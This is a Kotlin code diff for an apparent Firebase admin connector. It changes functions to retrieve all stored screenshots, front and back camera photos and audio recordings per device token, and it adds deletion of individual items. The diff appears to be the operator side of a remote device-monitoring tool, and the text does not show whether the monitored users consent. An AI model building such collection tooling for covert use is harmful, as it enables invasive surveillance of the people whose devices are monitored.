@@ -478,155 +478,174 @@ class FirebaseAdminConnector {
         )
     }
 
-    // Fetch screenshots/$token
-    suspend fun getScreenshot(deviceToken: String): MediaItem? = withContext(Dispatchers.IO) {
+    // Fetch ALL screenshots from screenshots/$token
+    suspend fun getScreenshots(deviceToken: String): List<MediaItem> = withContext(Dispatchers.IO) {
         val request = Request.Builder()
             .url("$rootUrl/screenshots/$deviceToken.json")
             .get()
             .build()
         try {
             client.newCall(request).execute().use { response ->
-                if (!response.isSuccessful) return@withContext null
-                val bodyStr = response.body?.string() ?: return@withContext null
-                if (bodyStr == "null" || bodyStr.isBlank()) return@withContext null
+                if (!response.isSuccessful) return@withContext emptyList()
+                val bodyStr = response.body?.string() ?: return@withContext emptyList()
+                if (bodyStr == "null" || bodyStr.isBlank()) return@withContext emptyList()
                 
-                // If it's a map (common when using push()), find the latest one
                 val rootJson = JSONObject(bodyStr)
-                var latestObj: JSONObject? = null
-                var latestTimestamp = 0L
+                val items = mutableListOf<MediaItem>()
 
                 if (rootJson.has("image") || rootJson.has("base64")) {
-                    // It's a single object
-                    latestObj = rootJson
-                    latestTimestamp = rootJson.optLong("timestamp", 0L)
+                    val base64 = rootJson.optString("image", rootJson.optString("base64", ""))
+                    if (base64.isNotBlank()) {
+                        items.add(MediaItem(
+                            id = "root",
+                            base64 = base64,
+                            timestamp = rootJson.optLong("timestamp", 0L),
+                            type = "screenshot"
+                        ))
+                    }
                 } else {
-                    // It's a map of ID -> Object
                     val keys = rootJson.keys()
                     while (keys.hasNext()) {
                         val key = keys.next()
                         val obj = rootJson.optJSONObject(key) ?: continue
-                        val ts = obj.optLong("timestamp", 0L)
-                        if (ts >= latestTimestamp) {
-                            latestTimestamp = ts
-                            latestObj = obj
+                        val base64 = obj.optString("image", obj.optString("base64", ""))
+                        if (base64.isNotBlank()) {
+                            items.add(MediaItem(
+                                id = key,
+                                base64 = base64,
+                                timestamp = obj.optLong("timestamp", 0L),
+                                type = "screenshot"
+                            ))
                         }
                     }
                 }
-
-                if (latestObj == null) return@withContext null
-
-                val base64 = latestObj.optString("image", latestObj.optString("base64", ""))
-                if (base64.isBlank()) return@withContext null
-                
-                return@withContext MediaItem(
-                    id = "screenshot_${latestTimestamp}",
-                    base64 = base64,
-                    timestamp = latestTimestamp,
-                    type = "screenshot"
-                )
+                return@withContext items.sortedByDescending { it.timestamp }
             }
         } catch (e: Exception) {
-            return@withContext null
+            return@withContext emptyList()
         }
     }
 
-    // Fetch camera_photos/$token
-    suspend fun getCameraPhoto(deviceToken: String): MediaItem? = withContext(Dispatchers.IO) {
+    // Fetch ALL camera_photos/$token
+    suspend fun getCameraPhotos(deviceToken: String): List<MediaItem> = withContext(Dispatchers.IO) {
         val request = Request.Builder()
             .url("$rootUrl/camera_photos/$deviceToken.json")
             .get()
             .build()
         try {
             client.newCall(request).execute().use { response ->
-                if (!response.isSuccessful) return@withContext null
-                val bodyStr = response.body?.string() ?: return@withContext null
-                if (bodyStr == "null" || bodyStr.isBlank()) return@withContext null
+                if (!response.isSuccessful) return@withContext emptyList()
+                val bodyStr = response.body?.string() ?: return@withContext emptyList()
+                if (bodyStr == "null" || bodyStr.isBlank()) return@withContext emptyList()
                 
                 val rootJson = JSONObject(bodyStr)
-                var latestObj: JSONObject? = null
-                var latestTimestamp = 0L
+                val items = mutableListOf<MediaItem>()
 
                 if (rootJson.has("image") || rootJson.has("base64")) {
-                    latestObj = rootJson
-                    latestTimestamp = rootJson.optLong("timestamp", 0L)
+                    val base64 = rootJson.optString("image", rootJson.optString("base64", ""))
+                    if (base64.isNotBlank()) {
+                        val camera = if (rootJson.optBoolean("isFront", false)) "front" else rootJson.optString("camera", "back")
+                        items.add(MediaItem(
+                            id = "root",
+                            base64 = base64,
+                            timestamp = rootJson.optLong("timestamp", 0L),
+                            type = "camera",
+                            cameraType = camera
+                        ))
+                    }
                 } else {
                     val keys = rootJson.keys()
                     while (keys.hasNext()) {
                         val key = keys.next()
                         val obj = rootJson.optJSONObject(key) ?: continue
-                        val ts = obj.optLong("timestamp", 0L)
-                        if (ts >= latestTimestamp) {
-                            latestTimestamp = ts
-                            latestObj = obj
+                        val base64 = obj.optString("image", obj.optString("base64", ""))
+                        if (base64.isNotBlank()) {
+                            val camera = if (obj.optBoolean("isFront", false)) "front" else obj.optString("camera", "back")
+                            items.add(MediaItem(
+                                id = key,
+                                base64 = base64,
+                                timestamp = obj.optLong("timestamp", 0L),
+                                type = "camera",
+                                cameraType = camera
+                            ))
                         }
                     }
                 }
-
-                if (latestObj == null) return@withContext null
-
-                val base64 = latestObj.optString("image", latestObj.optString("base64", ""))
-                if (base64.isBlank()) return@withContext null
-                val camera = if (latestObj.optBoolean("isFront", false)) "front" else latestObj.optString("camera", "back")
-                
-                return@withContext MediaItem(
-                    id = "camera_${latestTimestamp}",
-                    base64 = base64,
-                    timestamp = latestTimestamp,
-                    type = "camera",
-                    cameraType = camera
-                )
+                return@withContext items.sortedByDescending { it.timestamp }
             }
         } catch (e: Exception) {
-            return@withContext null
+            return@withContext emptyList()
         }
     }
 
-    // Fetch audio_records/$token
-    suspend fun getAudioRecord(deviceToken: String): MediaItem? = withContext(Dispatchers.IO) {
+    // Fetch ALL audio_records/$token
+    suspend fun getAudioRecords(deviceToken: String): List<MediaItem> = withContext(Dispatchers.IO) {
         val request = Request.Builder()
             .url("$rootUrl/audio_records/$deviceToken.json")
             .get()
             .build()
         try {
             client.newCall(request).execute().use { response ->
-                if (!response.isSuccessful) return@withContext null
-                val bodyStr = response.body?.string() ?: return@withContext null
-                if (bodyStr == "null" || bodyStr.isBlank()) return@withContext null
+                if (!response.isSuccessful) return@withContext emptyList()
+                val bodyStr = response.body?.string() ?: return@withContext emptyList()
+                if (bodyStr == "null" || bodyStr.isBlank()) return@withContext emptyList()
                 
                 val rootJson = JSONObject(bodyStr)
-                var latestObj: JSONObject? = null
-                var latestTimestamp = 0L
+                val items = mutableListOf<MediaItem>()
 
                 if (rootJson.has("audio") || rootJson.has("base64")) {
-                    latestObj = rootJson
-                    latestTimestamp = rootJson.optLong("timestamp", 0L)
+                    val base64 = rootJson.optString("audio", rootJson.optString("base64", ""))
+                    if (base64.isNotBlank()) {
+                        items.add(MediaItem(
+                            id = "root",
+                            base64 = base64,
+                            timestamp = rootJson.optLong("timestamp", 0L),
+                            type = "audio"
+                        ))
+                    }
                 } else {
                     val keys = rootJson.keys()
                     while (keys.hasNext()) {
                         val key = keys.next()
                         val obj = rootJson.optJSONObject(key) ?: continue
-                        val ts = obj.optLong("timestamp", 0L)
-                        if (ts >= latestTimestamp) {
-                            latestTimestamp = ts
-                            latestObj = obj
+                        val base64 = obj.optString("audio", obj.optString("base64", ""))
+                        if (base64.isNotBlank()) {
+                            items.add(MediaItem(
+                                id = key,
+                                base64 = base64,
+                                timestamp = obj.optLong("timestamp", 0L),
+                                type = "audio"
+                            ))
                         }
                     }
                 }
-
-                if (latestObj == null) return@withContext null
-
-                val base64 = latestObj.optString("audio", latestObj.optString("base64", ""))
-                if (base64.isBlank()) return@withContext null
-                
-                return@withContext MediaItem(
-                    id = "audio_${latestTimestamp}",
-                    base64 = base64,
-                    timestamp = latestTimestamp,
-                    type = "audio"
-                )
+                return@withContext items.sortedByDescending { it.timestamp }
             }
         } catch (e: Exception) {
-            return@withContext null
+            return@withContext emptyList()
+        }
+    }
+
+    // Delete a specific media item from Firebase
+    suspend fun deleteMediaItem(deviceToken: String, category: String, itemId: String): Boolean = withContext(Dispatchers.IO) {
+        // category should be "screenshots", "camera_photos", or "audio_records"
+        val url = if (itemId == "root") {
+            "$rootUrl/$category/$deviceToken.json"
+        } else {
+            "$rootUrl/$category/$deviceToken/$itemId.json"
+        }
+        
+        val request = Request.Builder()
+            .url(url)
+            .delete()
+            .build()
+        try {
+            client.newCall(request).execute().use { response ->
+                return@withContext response.isSuccessful
+            }
+        } catch (e: Exception) {
+            Log.e("FirebaseConnector", "Error deleting media item $itemId", e)
+            return@withContext false
         }
     }
 
